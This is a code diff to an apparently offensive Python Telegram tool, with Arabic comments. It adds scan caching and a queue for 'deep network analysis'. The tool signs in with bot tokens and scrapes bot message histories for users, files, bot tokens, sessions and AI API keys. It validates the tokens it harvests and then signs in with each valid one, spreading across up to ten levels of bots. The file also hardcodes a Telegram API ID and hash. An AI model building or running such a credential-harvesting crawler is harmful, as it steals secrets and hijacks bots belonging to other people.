@@ -17,7 +17,7 @@ import subprocess
 import tempfile
 import sqlite3
 import aiosqlite
-from datetime import datetime, timedelta
+from datetime import datetime, timedelta, timezone
 from collections import defaultdict
 from telethon import TelegramClient, events
 from telethon.tl.functions.messages import GetMessagesRequest, GetHistoryRequest
@@ -32,7 +32,7 @@ API_ID = 25875948
 API_HASH = 'bbc8cd4753b320c932bd56254d2917a0'
 
 SEND_DELAY = 0.3
-SESSION_DIR = 'sessions'
+SESSION_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sessions')
 DB_PATH = os.path.join(SESSION_DIR, 'bot_database.db')
 os.makedirs(SESSION_DIR, exist_ok=True)
 
@@ -755,6 +755,32 @@ async def set_scan_progress(bot_token, bot_username, last_scanned_id, max_id, is
         await db.commit()
 
 
+SCAN_FRESH_SECONDS = 24 * 60 * 60
+
+
+async def _scan_last_checked_at(bot_token):
+    """تاريخ آخر فحص من updated_at في scan_progress، أو None لو مش متسجل
+    (صف جديد أو عمود ناقص في قاعدة قديمة) - وقتها الفحص يعتبر قديم."""
+    try:
+        async with aiosqlite.connect(DB_PATH) as db:
+            cursor = await db.execute(
+                "SELECT updated_at FROM scan_progress WHERE bot_token = ?",
+                (bot_token,)
+            )
+            row = await cursor.fetchone()
+            if row and row[0]:
+                return datetime.strptime(row[0], '%Y-%m-%d %H:%M:%S').replace(tzinfo=timezone.utc)
+    except Exception:
+        return None
+    return None
+
+
+def _is_scan_fresh(last_checked):
+    if last_checked is None:
+        return False
+    return (datetime.now(timezone.utc) - last_checked).total_seconds() < SCAN_FRESH_SECONDS
+
+
 async def save_scan_batch(bot_token, users=(), files=(), photos=(), tokens=(), sessions=(), ai_keys=()):
     log_event("تخزين", f"حفظ دفعة للبوت {_mask_bot_token(bot_token)} - مستخدمين {len(list(users or ()))} ملفات {len(list(files or ()))} صور {len(list(photos or ()))} توكنات {len(list(tokens or ()))} جلسات {len(list(sessions or ()))} مفاتيح {len(list(ai_keys or ()))} ")
     async with aiosqlite.connect(DB_PATH) as db:
@@ -1157,6 +1183,12 @@ async def analyze_bot(bot_token, user_id, progress_callback=None, park_on_flood=
     try:
         await init_database()
         progress = await get_scan_progress(bot_token)
+        last_checked = await _scan_last_checked_at(bot_token)
+        fresh = _is_scan_fresh(last_checked)
+        log_event("فحص", f"البوت {_mask_bot_token(bot_token)} - آخر فحص {(last_checked.strftime('%Y-%m-%d %H:%M:%S') if last_checked else 'مفيش تاريخ')} - {'جديد أقل من 24 ساعة' if fresh else 'قديم، إعادة فحص'}")
+        if progress and progress['is_complete'] and fresh:
+            log_event("فحص", f"البوت {_mask_bot_token(bot_token)} مفحوص من أقل من 24 ساعة - الاعتماد على قاعدة البيانات من غير إعادة فحص")
+            return await load_scan_result(bot_token, progress['bot_username'], progress['max_id'])
         temp_session = os.path.join(SESSION_DIR, f"analyze_bot_{int(time.time())}_{hash(bot_token)}")
         temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
         if park_on_flood:
@@ -1164,13 +1196,18 @@ async def analyze_bot(bot_token, user_id, progress_callback=None, park_on_flood=
         await temp_bot.start(bot_token=bot_token)
         me = await temp_bot.get_me()
         bot_username = me.username
-        max_id = await find_max_message_id(temp_bot, raise_on_flood=park_on_flood)
+        if progress and not progress['is_complete'] and fresh:
+            max_id = progress['max_id']
+            log_event("فحص", f"البوت {_mask_bot_token(bot_token)} مفحوص من أقل من 24 ساعة - يكمل من نقطة الاستئناف لحد أعلى رقم محفوظ {max_id} من غير إعادة عد الرسايل")
+        else:
+            max_id = await find_max_message_id(temp_bot, raise_on_flood=park_on_flood)
         log_event("فحص", f"بدء فحص البوت {_mask_bot_token(bot_token)} - أعلى رقم {max_id} - الاستئناف من {(progress['last_scanned_id'] + 1) if progress else 1}")
         if progress and progress['is_complete'] and max_id <= progress['last_scanned_id']:
             log_event("تحقق", "الفحص كامل - إكمال التحقق من التوكنات الباقية قبل عرض النتيجة")
             remaining_tokens = await get_scan_tokens(bot_token)
             if remaining_tokens:
                 await validate_tokens_parallel(remaining_tokens, bot_token=bot_token)
+            await set_scan_progress(bot_token, bot_username, max_id, max_id, True)
             await temp_bot.disconnect()
             try:
                 if os.path.exists(f"{temp_session}.session"):
@@ -2029,7 +2066,6 @@ async def deep_network_analysis(main_bot_token, user_id, progress_callback=None,
             'all_sessions': [],
             'all_ai_keys': [],
         }
-        current_level = 0
         max_levels = 10
         examined_bots = 0
         async def _partial_result():
@@ -2042,94 +2078,88 @@ async def deep_network_analysis(main_bot_token, user_id, progress_callback=None,
                 'partial': True,
                 'message': 'تم إيقاف الفحص قبل اكتماله'
             }
-        while current_level < max_levels:
-            current_level_bots = [bot for bot in all_bots if bot['level'] == current_level]
+        # قائمة شغل عامة بدل حواجز المستويات: أي بوت بيخلص توكناته بتتدخل
+        # الطابور على طول (بمستواه + 1)، والبوت الموقوف بيرجع لما يفضى مكان
+        # وفلوده يخلص - حتى لو المستوى اللي كان فيه خلص ومستوى بعده شغال.
+        # المستوى التاني بيدخل عادي من غير ما يستنى الموقوفين.
+        seen_tokens = {b['token'] for b in all_bots}
+        queue = []
+        for token_info in await get_scan_tokens(main_bot_token):
+            if token_info['valid']:
+                token = token_info['token']
+                if token not in seen_tokens:
+                    seen_tokens.add(token)
+                    queue.append((token, 1))
+        deferred = {}
+        running = set()
+
+        async def _scan_one(token, level):
+            return token, level, await analyze_bot(token, user_id, park_on_flood=True)
+
+        while queue or running or deferred:
+            while len(running) < NETWORK_MAX_CONCURRENT_BOTS:
+                now = time.monotonic()
+                ready = [t for t, (at, lv) in deferred.items() if at <= now]
+                if ready:
+                    tok = min(ready, key=lambda t: deferred[t][0])
+                    lv = deferred[tok][1]
+                    del deferred[tok]
+                    log_event("فحص شبكي", f"البوت {_mask_bot_token(tok)} رجع الطابور بعد الفلود ويت - هيكمل من نقطة الاستئناف")
+                elif queue:
+                    tok, lv = queue.pop(0)
+                else:
+                    break
+                running.add(asyncio.create_task(_scan_one(tok, lv)))
+            if not running:
+                wait = min(at for at, _ in deferred.values()) - time.monotonic()
+                if wait > 0:
+                    log_event("فحص شبكي", f"مستني {wait:.0f} ثانية لحد ما الفلود ويت يخلص عشان بوت موقوف يرجع يكمل")
+                    await asyncio.sleep(wait)
+                continue
+            done, _ = await asyncio.wait(running, return_when=asyncio.FIRST_COMPLETED)
+            for task in done:
+                running.discard(task)
+                token, level, new_analysis = await task
+                if new_analysis and new_analysis.get('parked'):
+                    wait_s = new_analysis.get('flood_wait_seconds') or 0
+                    deferred[token] = (time.monotonic() + wait_s, level)
+                    log_event("فحص شبكي", f"البوت {_mask_bot_token(token)} طلع من الطابور فلود ويت {wait_s} ثانية - هيرجع لما يفضى مكان")
+                    continue
+                if new_analysis and new_analysis['success']:
+                    all_bots.append(_light_bot(token, new_analysis, level))
+                    aggregated_stats['total_bots'] += 1
+                    aggregated_stats['total_users'] += new_analysis['total_users']
+                    aggregated_stats['total_files'] += new_analysis['total_files']
+                    aggregated_stats['total_photos'] += new_analysis['total_photos']
+                    aggregated_stats['total_tokens'] += new_analysis['tokens']['total']
+                    aggregated_stats['valid_tokens'] += new_analysis['tokens']['valid']
+                    aggregated_stats['total_sessions'] += new_analysis['sessions']['total']
+                    aggregated_stats['total_ai_keys'] += new_analysis.get('ai_keys', {}).get('total', 0)
+                    examined_bots += 1
+                    for token_info in await get_scan_tokens(token):
+                        if token_info['valid']:
+                            t = token_info['token']
+                            if t not in seen_tokens:
+                                seen_tokens.add(t)
+                                if level + 1 <= max_levels:
+                                    queue.append((t, level + 1))
+                    if progress_callback:
+                        if not await progress_callback(examined_bots, len(all_bots), level):
+                            print("⏹ تم طلب إيقاف الفحص الشبكي")
+                            user_state = await get_user_state(user_id)
+                            user_state['stop_requested'] = True
+                            await set_user_state(user_id, user_state)
+                            for t in running:
+                                t.cancel()
+                            await asyncio.gather(*running, return_exceptions=True)
+                            return await _partial_result()
             user_state = await get_user_state(user_id)
             if user_state.get('stop_requested'):
                 print("⏹ تم طلب إيقاف الفحص الشبكي")
+                for t in running:
+                    t.cancel()
+                await asyncio.gather(*running, return_exceptions=True)
                 return await _partial_result()
-            # جمع توكنات المستوى كله مرة واحدة، من غير تكرار، وبعدين فحصها مع بعض:
-            # كل بوت بيسحب رسايله ويستخرج أنماطه لوحده. لو واحد وقع في فلود ويت
-            # بيطلع من الطابور وبيدخل حد مكانه، وهو بيرجع تاني لما يفضى مكان
-            # وفلوده يخلص - المهم يكمل في نفس التشغيل مش يترمي.
-            # الدفعات جوه البوت الواحد لسه ورا بعض لأنها على نفس الحساب،
-            # ولو اتسحبت مع بعض هتعمل فلود أسرع.
-            seen_tokens = {b['token'] for b in all_bots}
-            level_tokens = []
-            for bot_data in current_level_bots:
-                current_tokens = await get_scan_tokens(bot_data['token'])
-                for token_info in current_tokens:
-                    if token_info['valid']:
-                        token = token_info['token']
-                        if token in seen_tokens:
-                            continue
-                        seen_tokens.add(token)
-                        level_tokens.append(token)
-
-            async def _scan_one(token):
-                return token, await analyze_bot(token, user_id, park_on_flood=True)
-
-            pending = list(level_tokens)
-            parked = {}
-            running = set()
-            while pending or running or parked:
-                while len(running) < NETWORK_MAX_CONCURRENT_BOTS:
-                    ready = [t for t, at in parked.items() if at <= time.monotonic()]
-                    if ready:
-                        tok = min(ready, key=lambda t: parked[t])
-                        del parked[tok]
-                        log_event("فحص شبكي", f"البوت {_mask_bot_token(tok)} رجع الطابور بعد الفلود ويت - هيكمل من نقطة الاستئناف")
-                    elif pending:
-                        tok = pending.pop(0)
-                    else:
-                        break
-                    running.add(asyncio.create_task(_scan_one(tok)))
-                if not running:
-                    wait = min(parked.values()) - time.monotonic()
-                    if wait > 0:
-                        log_event("فحص شبكي", f"مستني {wait:.0f} ثانية لحد ما الفلود ويت يخلص عشان بوت موقوف يرجع يكمل")
-                        await asyncio.sleep(wait)
-                    continue
-                done, _ = await asyncio.wait(running, return_when=asyncio.FIRST_COMPLETED)
-                for task in done:
-                    running.discard(task)
-                    token, new_analysis = await task
-                    if new_analysis and new_analysis.get('parked'):
-                        wait_s = new_analysis.get('flood_wait_seconds') or 0
-                        parked[token] = time.monotonic() + wait_s
-                        log_event("فحص شبكي", f"البوت {_mask_bot_token(token)} طلع من الطابور فلود ويت {wait_s} ثانية - هيرجع لما يفضى مكان")
-                        continue
-                    if new_analysis and new_analysis['success']:
-                        all_bots.append(_light_bot(token, new_analysis, current_level + 1))
-                        aggregated_stats['total_bots'] += 1
-                        aggregated_stats['total_users'] += new_analysis['total_users']
-                        aggregated_stats['total_files'] += new_analysis['total_files']
-                        aggregated_stats['total_photos'] += new_analysis['total_photos']
-                        aggregated_stats['total_tokens'] += new_analysis['tokens']['total']
-                        aggregated_stats['valid_tokens'] += new_analysis['tokens']['valid']
-                        aggregated_stats['total_sessions'] += new_analysis['sessions']['total']
-                        aggregated_stats['total_ai_keys'] += new_analysis.get('ai_keys', {}).get('total', 0)
-                        examined_bots += 1
-                        if progress_callback:
-                            if not await progress_callback(examined_bots, len(all_bots), current_level + 1):
-                                print("⏹ تم طلب إيقاف الفحص الشبكي")
-                                user_state = await get_user_state(user_id)
-                                user_state['stop_requested'] = True
-                                await set_user_state(user_id, user_state)
-                                for t in running:
-                                    t.cancel()
-                                await asyncio.gather(*running, return_exceptions=True)
-                                return await _partial_result()
-                user_state = await get_user_state(user_id)
-                if user_state.get('stop_requested'):
-                    print("⏹ تم طلب إيقاف الفحص الشبكي")
-                    for t in running:
-                        t.cancel()
-                    await asyncio.gather(*running, return_exceptions=True)
-                    return await _partial_result()
-            current_level += 1
-            if current_level >= max_levels:
-                break
         aggregated_stats['total_users_unique'] = await count_unique_users([b['token'] for b in all_bots])
         return {
             'success': True,
